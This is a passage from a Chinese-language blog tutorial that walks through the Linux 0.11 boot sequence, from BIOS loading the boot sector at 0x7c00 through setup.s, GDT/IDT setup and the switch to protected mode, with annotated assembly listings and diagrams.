&#96;0xaa&#96;，如果是就将其判定为启动区，如果末尾不是这两个字节，就会继续向下寻找，找不到报错。</span><br></pre></td></tr></table></figure><p>加载的意思就是<strong>把设备程序复制到内存的进程中</strong>；</p><p>在这里就是找到启动区之后 BIOS 就会把启动区的内容复制到内存中的 0x7c00（开发团队定的） 处，指令就会在这执行。</p><p>启动区 512 字节的代码示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">; hello-os</span><br><span class="line">; TAB&#x3D;4</span><br><span class="line"></span><br><span class="line">  ORG  0x7c00   ;程序加载到内存的 0x7c00 这个位置</span><br><span class="line"></span><br><span class="line">;程序主体</span><br><span class="line"></span><br><span class="line">entry:</span><br><span class="line">  MOV  AX,0   ;初始化寄存器</span><br><span class="line">  MOV  SS,AX</span><br><span class="line">  MOV  SP,0x7c00</span><br><span class="line">  MOV  DS,AX   ;段寄存器初始化为 0</span><br><span class="line">  MOV  ES,AX</span><br><span class="line">  MOV  SI,msg</span><br><span class="line">putloop:</span><br><span class="line">  MOV  AL,[SI]</span><br><span class="line">  ADD  SI,1</span><br><span class="line">  CMP  AL,0   ;如果遇到 0 结尾的，就跳出循环不再打印新字符</span><br><span class="line">  JE  fin</span><br><span class="line">  MOV  AH,0x0e   ;指定文字</span><br><span class="line">  MOV  BX,15   ;指定颜色</span><br><span class="line">  INT  0x10   ;调用 BIOS 显示字符函数</span><br><span class="line">  JMP  putloop</span><br><span class="line">fin:</span><br><span class="line">  HLT</span><br><span class="line">  JMP  fin</span><br><span class="line">msg:</span><br><span class="line">  DB  0x0a,0x0a  ;换行、换行</span><br><span class="line">  DB  &quot;hello-os&quot;</span><br><span class="line">  DB  0x0a   ;换行</span><br><span class="line">  DB  0    ;0 结尾</span><br><span class="line"></span><br><span class="line">  RESB 0x7dfe-$   ;填充0到512字节</span><br><span class="line">  DB 0x55, 0xaa   ;可启动设备标识</span><br></pre></td></tr></table></figure><p>附上这个流程的简图：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt/1647006818169834/2a8d8a3e0c168b4dc281c3591ef325ed6483995c.jpg" alt="CE781E6560EB019D97000D6CDC4F1EC4"></p><hr><p>以 Linux-0.11 为例</p><h2 id="BIOS-将启动区复制到内存0x7c00"><a href="#BIOS-将启动区复制到内存0x7c00" class="headerlink" title="BIOS 将启动区复制到内存0x7c00"></a>BIOS 将启动区复制到内存0x7c00</h2><p>开机 BIOS 会将硬盘中启动区的 512 字节的数据，复制到内存 0x7c00 的位置，并跳转到该处执行。</p><p>用图表示就是：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt/1647583152427772/5a4ce99a5f0c81c4a4dac52b0e517cd0b3720bb8.png" alt="未命名图片"></p><p>最开始的代码是用汇编语言写的 bootsect.s，，位于 boot 文件夹下，存放在启动区中，也就是我们复制到 内存 0x7c00 处地址的内容。</p><p>所以就从这开始分析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax,0x07c0</span><br><span class="line">mov ds,ax</span><br></pre></td></tr></table></figure><p>首先会将 ds 寄存器赋值为 0x07c0 ，众所周知，ds 寄存器是数据段寄存器，存储着数据段的起始地址。之后的地址都会以它为标准进行偏移，也方便内存利用这个地址进行寻址。</p><p>但是为啥不是 0x7c00 呢？是因为地址的寻址方式，使得段地址要先左移四位。</p><hr><h2 id="再挪个位置：内存0x90000"><a href="#再挪个位置：内存0x90000" class="headerlink" title="再挪个位置：内存0x90000"></a>再挪个位置：内存0x90000</h2><p>接着往下看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov ax,0x9000</span><br><span class="line">mov es,ax</span><br><span class="line">mov cx,#256</span><br><span class="line">sub si,si</span><br><span class="line">sub di,di</span><br><span class="line">rep movw</span><br></pre></td></tr></table></figure><p>把 es(额外段寄存器) 赋值成 0x9000，cx 寄存器变成 十进制的 256(代码里是用十进制表示的，和其他地方有些不一样)，si、di 为 0。</p><p>整合一下所有的寄存器就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ds &#x3D; 0x07c0</span><br><span class="line">es &#x3D; 0x9000</span><br><span class="line">cx &#x3D; 256</span><br><span class="line">di &#x3D; si &#x3D;0</span><br></pre></td></tr></table></figure><p>然后执行最后一句 ‘rep movw’</p><p>rep 表示重复执行后面的指令，movw 表示复制一个字，所有整句话的意思就是 <strong>重复复制一个字</strong>。</p><p>那么问题来了：</p><p>复制多少次？因为 cx 记录次数，所以会复制 256 次。</p><p>从哪复制到哪呢？是从 ds:si 复制到 es:di </p><p>一次复制多少呢？ 刚刚有说过复制一个字，也就是两个字节(一个字不一定是两个字节，只是这个例子是这样)</p><p>所以整段话用更通俗的语言描述出来就是：<strong>将内存地址</strong> <strong>0x7c00</strong> <strong>处开始往后的</strong> <strong>512</strong> <strong>字节的数据复制到</strong> <strong>0x90000 处</strong>。</p><p>所以经过这么一折腾，操作系统最开始的代码，又被挪到了另一个地方：0x90000。</p><hr><h2 id="内存的初步规划"><a href="#内存的初步规划" class="headerlink" title="内存的初步规划"></a>内存的初步规划</h2><p>接着往下看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jmpi go,0x9000</span><br><span class="line">go: </span><br><span class="line">  mov ax,cs</span><br><span class="line">  mov ds,ax</span><br></pre></td></tr></table></figure><p>jmpi 是一个段间跳转指令，表示跳转到 0x9000:go 处执行，根据寻址方式可以知道，go 是一个偏移地址，所以这句指令意思就是<strong>跳到 0x90000+go 处地址执行</strong>。</p><p>也就是后面的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">go: mov ax,cs</span><br><span class="line">    mov ds,ax</span><br><span class="line">    mov es,ax</span><br><span class="line">    mov ss,ax</span><br><span class="line">    mov sp,#0xFF00</span><br></pre></td></tr></table></figure><p>全是赋值操作，把 cs 寄存器的值分别复制给 ds、es、ss 寄存器，然后把 0xff00 给了sp 寄存器。</p><p>CS 寄存器表示代码段寄存器，是 CPU 当前正在执行的代码在内存中的位置，由 CS:IP 这组寄存器配合指向的，CS 是基址，IP 是偏移。</p><p>所以之前执行 jmpi go,0x9000 后，CS 就被赋值为了 0x9000，之后的 mov 操作就把 ds、es、ss 这些寄存器都赋值为了 0x9000。</p><p>ds为数据段寄存器，之前代码在 0x7c00 处，所以它被赋值为了 0x07c0，现在代码在 0x90000 处，所以自然就被赋值成了 0x9000。</p><p>ss 是栈段寄存器，会配合栈基址寄存器 sp 来表示栈顶，此时 sp 被赋值为了 0xFF00，所以现在的栈顶地址是 ss:sp 所指向的 0x9FF00。这么设置是因为代码段在 0x90000，栈顶离代码段是很远的，所以栈向下发展就很难和代码段撞上。</p><p>总结一下就是，利用跳转指令跳到空间更大的地方，给一些寄存器赋值，说白了就是做了一个内存的初步规划，通过设置<strong>基址</strong>的方法访问代码和数据，设置<strong>栈顶</strong>指针的方法访问栈。</p><hr><h2 id="将整个操作系统代码搬到内存中"><a href="#将整个操作系统代码搬到内存中" class="headerlink" title="将整个操作系统代码搬到内存中"></a>将整个操作系统代码搬到内存中</h2><p>接着往下看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">load_setup:</span><br><span class="line">    mov dx,#0x0000      ; drive 0, head 0</span><br><span class="line">    mov cx,#0x0002      ; sector 2, track 0</span><br><span class="line">    mov bx,#0x0200      ; address &#x3D; 512, in 0x9000</span><br><span class="line">    mov ax,#0x0200+4    ; service 2, nr of sectors</span><br><span class="line">    int 0x13            ; read it</span><br><span class="line">    jnc ok_load_setup       ; ok - continue</span><br><span class="line">    mov dx,#0x0000</span><br><span class="line">    mov ax,#0x0000      ; reset the diskette</span><br><span class="line">    int 0x13</span><br><span class="line">    jmp load_setup</span><br><span class="line"></span><br><span class="line">ok_load_setup:</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>int 0x13 表示发起 0x13 号中断，上面被赋值的寄存器都作为它的参数。这句指令表示<strong>读取磁盘</strong>。</p><p>整句代码的意思就是将硬盘的第 2 个扇区开始，把数据加载到内存 0x90200 处，共加载 4 个扇区。</p><p>大概长这样：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt/1647584564986120/1a31cdf7f753eab624e7aad84f70d671c200d19e.png" alt="未命名图片"></p><p>可以看到程序有个判断，意思就是如果读取成功，就会跳到 ok_load_setup ，如果失败就会重试。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ok_load_setup:</span><br><span class="line">    ...</span><br><span class="line">    mov ax,#0x1000</span><br><span class="line">    mov es,ax       ; segment of 0x10000</span><br><span class="line">    call read_it</span><br><span class="line">    ...</span><br><span class="line">    jmpi 0,SETUPSEG ；SETUPSEG &#x3D; 0x9020</span><br></pre></td></tr></table></figure><p>只看重要部分，这一段代码的意思就是把从硬盘第 6 个扇区开始往后的 240 个扇区，加载到内存 0x10000 处。</p><p>在这之后，整个操作系统的代码，就全部从磁盘搬到内存中了。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt/1647584748063609/31a4ba8e328760bbea62a993bfab1dc8c7194568.png" alt="未命名图片"></p><p>之后再通过 jmpi 0,0x9020 ，跳到 0x90200 处，也就是硬盘里第二个扇区的开始。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">再补充一下，操作系统的编译过程，整个过程是通过 Makefile 和  build.c 配合完成的</span><br><span class="line">1. 把 bootsect.s 编译成 bootsect 放在硬盘的 1 扇区</span><br><span class="line">2. 把 setup.s 编译成 setup 放在硬盘的 2~5 扇区。</span><br><span class="line">3.把剩下的全部代码（head.s 作为开头）编译成 system 放在硬盘的随后 240 个扇区。</span><br></pre></td></tr></table></figure><hr><h2 id="又一次做内存调整"><a href="#又一次做内存调整" class="headerlink" title="又一次做内存调整"></a>又一次做内存调整</h2><p>所以现在就会执行第二扇区的开始内容了，也就是 setup.s 文件。先看看 setup.s 的开头</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">start:</span><br><span class="line">    mov ax,#0x9000  ; this is done in bootsect already, but...</span><br><span class="line">    mov ds,ax</span><br><span class="line">    mov ah,#0x03    ; read cursor pos</span><br><span class="line">    xor bh,bh</span><br><span class="line">    int 0x10        ; save it in known place, con_init fetches</span><br><span class="line">    mov [0],dx      ; it from 0x90000.</span><br></pre></td></tr></table></figure><p>INT 0x10 也是一个中断指令，用来触发屏幕及显示器的服务程序。ah 寄存器被赋为 0x03 表示读光标位置。</p><p>当这个程序执行完毕并返回时，dx 寄存器的值表示光标的位置，其中 dh 存储行号，dl 存储列号。</p><p>mov [0],dx 表示把光标的位置存储到偏移为 0 的地方，也就是 0x90000。</p><p>接下来的代码也和之前的套路差不多，一一对应着看就行。(参考链接：<a href="https://zh.wikipedia.org/zh-cn/BIOS%E4%B8%AD%E6%96%B7%E5%91%BC%E5%8F%AB">https://zh.wikipedia.org/zh-cn/BIOS%E4%B8%AD%E6%96%B7%E5%91%BC%E5%8F%AB</a>)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">比如获取内存信息。</span><br><span class="line">; Get memory size (extended mem, kB)</span><br><span class="line">    mov ah,#0x88</span><br><span class="line">    int 0x15</span><br><span class="line">    mov [2],ax</span><br><span class="line">获取显卡显示模式。</span><br><span class="line">; Get video-card data:</span><br><span class="line">    mov ah,#0x0f</span><br><span class="line">    int 0x10</span><br><span class="line">    mov [4],bx      ; bh &#x3D; display page</span><br><span class="line">    mov [6],ax      ; al &#x3D; video mode, ah &#x3D; window width</span><br><span class="line">检查显示方式并取参数</span><br><span class="line">; check for EGA&#x2F;VGA and some config parameters</span><br><span class="line">    mov ah,#0x12</span><br><span class="line">    mov bl,#0x10</span><br><span class="line">    int 0x10</span><br><span class="line">    mov [8],ax</span><br><span class="line">    mov [10],bx</span><br><span class="line">    mov [12],cx</span><br><span class="line">获取第一块硬盘的信息。</span><br><span class="line">; Get hd0 data</span><br><span class="line">    mov ax,#0x0000</span><br><span class="line">    mov ds,ax</span><br><span class="line">    lds si,[4*0x41]</span><br><span class="line">    mov ax,#INITSEG</span><br><span class="line">    mov es,ax</span><br><span class="line">    mov di,#0x0080</span><br><span class="line">    mov cx,#0x10</span><br><span class="line">    rep</span><br><span class="line">    movsb</span><br><span class="line">获取第二块硬盘的信息。</span><br><span class="line">; Get hd1 data</span><br><span class="line">    mov ax,#0x0000</span><br><span class="line">    mov ds,ax</span><br><span class="line">    lds si,[4*0x46]</span><br><span class="line">    mov ax,#INITSEG</span><br><span class="line">    mov es,ax</span><br><span class="line">    mov di,#0x0090</span><br><span class="line">    mov cx,#0x10</span><br><span class="line">    rep</span><br><span class="line">    movsb</span><br></pre></td></tr></table></figure><p>经过这一连串的代码后，各地址存储的内容如下：</p><p>之前说过 0x90000 往后的 512 字节被复制成了 bootsect，所以这个地方相当于覆盖掉了一些 bootsect 的内容。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt/1647585189534501/ced2dcc9c0e660e93c7f580ab1bd23e8e1136be8.png" alt="未命名图片"></p><p>之后在分析用 C语言 编写的操作系统时，相应的变量会在上面给出的对应地址中取。</p><p>存储好信息后，接着往下看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cli         ; no interrupts allowed ;</span><br></pre></td></tr></table></figure><p>cli 是关闭中断的意思</p><p>继续看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">; first we move the system to it&#39;s rightful place</span><br><span class="line">    mov ax,#0x0000</span><br><span class="line">    cld         ; &#39;direction&#39;&#x3D;0, movs moves forward</span><br><span class="line">do_move:</span><br><span class="line">    mov es,ax       ; destination segment</span><br><span class="line">    add ax,#0x1000</span><br><span class="line">    cmp ax,#0x9000</span><br><span class="line">    jz  end_move</span><br><span class="line">    mov ds,ax       ; source segment</span><br><span class="line">    sub di,di</span><br><span class="line">    sub si,si</span><br><span class="line">    mov cx,#0x8000</span><br><span class="line">    rep movsw</span><br><span class="line">    jmp do_move</span><br><span class="line">; then we load the segment descriptors</span><br><span class="line">end_move:</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>结合之前分析的，这段代码的意思就是把内存 0x10000 到 0x90000 的内容复制到 0x00000 处。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt/1647585409694916/2bed17af7ad43a0852b8cd5e703fbe47c0b0e0fa.png" alt="未命名图片"></p><p>也就是 0x00000 到 0x80000 的内容被复制成了 system，包括之前的 0x7c00 处的 bootsect 也被覆盖了；system 可以理解为操作系统的全部，是除 bootsect 和 setup 之外全部程序链接在一起的结果。</p><p>那么现在的内存布局就是这样：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt/1647585565732944/cc5d52e70fcac8af64b60263edaeb11a22f78b5e.png" alt="未命名图片"></p><p>总结一下前面，操作系统又给自己移了下位置：从 0 开始存放着操作系统的所有代码，即 system，0x90000 之后的几十个字节存放了一些设备信息。</p><hr><h2 id="模式转换"><a href="#模式转换" class="headerlink" title="模式转换"></a>模式转换</h2><p>接着会进行一项大工程，模式转换，即把现在 16 位的实模式转换成 32 位的保护模式。先别急着纠结什么是实模式和保护模式，等会就说。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lidt  idt_48      ; load idt with 0,0</span><br><span class="line">lgdt  gdt_48      ; load gdt with whatever appropriate</span><br></pre></td></tr></table></figure><p>要读懂这些指令，得先清楚实模式和保护模式寻址的区别：</p><p>实模式：物理地址=段基址左移四位+偏移地址。</p><p>保护模式：段寄存器（比如 ds、ss、cs）里存储的是段选择子，段选择子去全局描述符表 gdt 中寻找段描述符，从中取出段基址。</p><p>整个过程如下：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt/1649387713365211/883583318ae1286e5027b74d8feedd0eaf6091c9.png" alt="640 (2)"></p><p>取出段基址的前提是 CPU 要知道存段基址的地方在哪，所以操作系统会把这个位置存储在一个叫 gdtr 的寄存器中。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt/1647585788244847/bd62219d0cb3eeefdbe1495e756d12d1d5f18054.png" alt="未命名图片"></p><p><code>lgdt gdt_48</code> 就是用来干这事的。</p><p>lgdt 指令就是把后面的 gdt_48 存入 gdtr 寄存器中。</p><p>再具体看看 gdt_48 长什么样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.word0x800! gdt limit&#x3D;2048, 256 GDT entries</span><br><span class="line">.word512+gdt,0x9! gdt base &#x3D; 0X9xxxx</span><br></pre></td></tr></table></figure><p>看标签可以看出它是个 48 位的数据，其中高 32 位存储着 gdt 的内存地址：0x90200+gdt</p><p>指令中的 gdt 代表处在当下文件的偏移量，而文件又是 setup.s，所以基址就是 0x90200，所以 全局描述符表 gdt 所在的地址就是 0x90200+gdt。</p><p>gdt 里存储了一系列段描述符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gdt:</span><br><span class="line">.word0,0,0,0! dummy</span><br><span class="line"></span><br><span class="line">.word0x07FF! 8Mb - limit&#x3D;2047 (2048*4096&#x3D;8Mb)</span><br><span class="line">.word0x0000! base address&#x3D;0</span><br><span class="line">.word0x9A00! code read&#x2F;exec</span><br><span class="line">.word0x00C0! granularity&#x3D;4096, 386</span><br><span class="line"></span><br><span class="line">.word0x07FF! 8Mb - limit&#x3D;2047 (2048*4096&#x3D;8Mb)</span><br><span class="line">.word0x0000! base address&#x3D;0</span><br><span class="line">.word0x9200! data read&#x2F;write</span><br><span class="line">.word0x00C0! granularity&#x3D;4096, 386</span><br></pre></td></tr></table></figure><p>看一下全局描述符表的构成：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt/1647585876571874/dc8007e7201b63e0efdd269d9dc95448d41be498.png" alt="未命名图片"></p><p>可以看到目前有三个段描述符，第一个为空，第二个是代码段描述符，第三个是数据段描述符。</p><p>第二个和第三个段描述符的段基址都是 0 ，也就是说通过段选择子找到的无论是代码段还是数据段，取出的段地址都是 0 ，所以物理地址就是直接给出的偏移地址。</p><p>现在再来讲讲 lidt idt_48 是干嘛的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">idt_48:</span><br><span class="line">.word0! idt limit&#x3D;0</span><br><span class="line">.word0,0! idt base&#x3D;0L</span><br></pre></td></tr></table></figure><p>功能和 lgdt gdt_48 差不多</p><p>之前有说过 gdtr 寄存器存储着<strong>全局描述符表gdt</strong>的地址</p><p>idtr 寄存器存储的是<strong>中断描述符表idt</strong>的地址，当发生中断时，CPU 就会通过中断号去中断描述符表中找到中断处理程序的地址，然后跳过去执行。</p><p>总结一下前面，利用两个指令将全局描述符表和中断描述符表地址放入相应的寄存器中，也讲了描述表的地址要怎么看。</p><p>现在内存结构：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt/1649387124416308/ac8334a059eefd075d21f2eb4790e20b66d79eec.png" alt="640"></p><hr><h2 id="正式开启保护模式，跳至system处执行"><a href="#正式开启保护模式，跳至system处执行" class="headerlink" title="正式开启保护模式，跳至system处执行"></a>正式开启保护模式，跳至system处执行</h2><p>上面说的只是进入保护模式前准备工作的一部分，接着往下看。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov al,#0xD1        ; command write</span><br><span class="line">out #0x64,al</span><br><span class="line">mov al,#0xDF        ; A20 on</span><br><span class="line">out #0x60,al</span><br></pre></td></tr></table></figure><p>这段代码的意思是：打开 A20 地址线</p><p>我们知道的是 8086 的 CPU 地址总线是 20 位，所以如果程序给出 21 位的内存地址，多出来的一位就会被忽略，举个例子就是：<code>1 0000 00000000 00000000</code></p><p>那个 1 因为处在第 21 位，所以会被忽略，整个内存地址算下来就是 0，如今 CPU 已经有 32位 和 64位，但是因为兼容性，还是要保持只能用 20 位地址线的模式，所以打开 A20 地址线就相当于让地址总线突破 20 位变为 32位。</p><p>接着往下就是一大坨代码，不需要特别了解，就是对可编程中断控制器 8259 芯片进行的编程，然后引脚和中断号关系对应如下：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt/1647586298118237/4ed2e437187e104401fab5e32bdb6a24dd428ac5.png" alt="未命名图片"></p><p>然后才到真正切换模式的时候：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,#0x0001  ; protected mode (PE) bit</span><br><span class="line">lmsw ax      ; This is it;</span><br><span class="line">jmpi 0,8     ; jmp offset 0 of segment 8 (cs)</span><br></pre></td></tr></table></figure><p>前两行把 cr0 这个寄存器位 0 置 1，就会切到保护模式</p><p>后一行 <code>jmpi 0,8</code>，8 表示 cs 中的值，0 表示偏移地址。因为现在是保护模式，所以 cs 里存的是段选择子。8 用二进制表示就是：<code>00000,0000,0000,1000</code></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt/1647586473179939/3bd5457f3eb4ef80f21d0b91e7247db64898c136.png" alt="未命名图片"></p><p>对应着表的结构图可以发现，描述符索引就是1，再根据这个索引去全局描述符表里找段描述符，从而取出地址。</p><p>之前有说过，全局描述符表中0对应的空，1对应的代码段描述符(可读可执行)，2对应的数据段描述符(可读可写)，所以这里对应的就是代码段描述符，段基址都为0。又因为偏移也是0，所以整个地址就是0。也就是跳到内存地址为0处。</p><p>内存地址为 0 处之前也说过是system，system 可以理解为操作系统的全部，是除 bootsect 和 setup 之外全部程序链接在一起的结果。现在 bootsect 和 setup 两个文件都分析过了，所以盲猜 head.s 就是 system 的一部分，我们接下来就分析它。</p><p>总结一下之前的，开启了保护模式，并跳转到了 system 处执行。</p><hr><h2 id="再次设置-idt-和-gdt"><a href="#再次设置-idt-和-gdt" class="headerlink" title="再次设置 idt 和 gdt"></a>再次设置 idt 和 gdt</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_pg_dir:</span><br><span class="line">.globl startup_32</span><br><span class="line">_startup_32:</span><br><span class="line">    mov eax,0x10</span><br><span class="line">    mov ds,ax</span><br><span class="line">    mov es,ax</span><br><span class="line">    mov fs,ax</span><br><span class="line">    mov gs,ax</span><br><span class="line">    lss esp,_stack_start</span><br></pre></td></tr></table></figure><p>_pg_dir 表示页目录，之后设置分页机制，页目录会存放在这。</p><p>之后就是把 ds、es、fs、gs 段寄存器赋值为 0x10，0x10对应的二进制数是10000，对应全局描述符表里的数据段描述符。(描述符索引里是 10，转换成十进制就是 2 )</p><p>lss 指令表示把 esp 指向 _stack_start(之前在 0x9FF00)</p><hr><p>这里补充一下 _stack_start，它被定义在 sched.c 里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> user_stack[<span class="number">4096</span> &gt;&gt; <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">long</span> *a;</span><br><span class="line">  <span class="keyword">short</span> b;</span><br><span class="line">&#125;</span><br><span class="line">stack_start = &#123;&amp;user_stack[<span class="number">4096</span> &gt;&gt; <span class="number">2</span>], <span class="number">0x10</span>&#125;;</span><br></pre></td></tr></table></figure><p>stack_start结构中高位 8 字节是 0x10，会赋值给 ss 栈段寄存器，低位 16 字节是 user_stack 这个数组的最后一个元素的地址值，会赋值给 esp 寄存器。又因为 0x10 对应全局描述符表里的数据段描述符，基址为 0。所以整个栈顶的地址，就是 esp 里存的地址。</p><hr><p>继续往下看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">call setup_idt ;设置中断描述符表</span><br><span class="line">call setup_gdt ;设置全局描述符表</span><br><span class="line">mov eax,10h</span><br><span class="line">mov ds,ax</span><br><span class="line">mov es,ax</span><br><span class="line">mov fs,ax</span><br><span class="line">mov gs,ax</span><br><span class="line">lss esp,_stack_start</span><br></pre></td></tr></table></figure><p>设置了 idt 和 gdt ，然后又重新执行了一次之前的操作</p><p>重新再执行一次的原因是因为上面修改了 gdt</p><p>先来看看 setup_idt ，即设置 idt 的具体代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">setup_idt:</span><br><span class="line">    lea edx,ignore_int</span><br><span class="line">    mov eax,00080000h</span><br><span class="line">    mov ax,dx</span><br><span class="line">    mov dx,8E00h</span><br><span class="line">    lea edi,_idt</span><br><span class="line">    mov ecx,256</span><br><span class="line">rp_sidt:</span><br><span class="line">    mov [edi],eax</span><br><span class="line">    mov [edi+4],edx</span><br><span class="line">    add 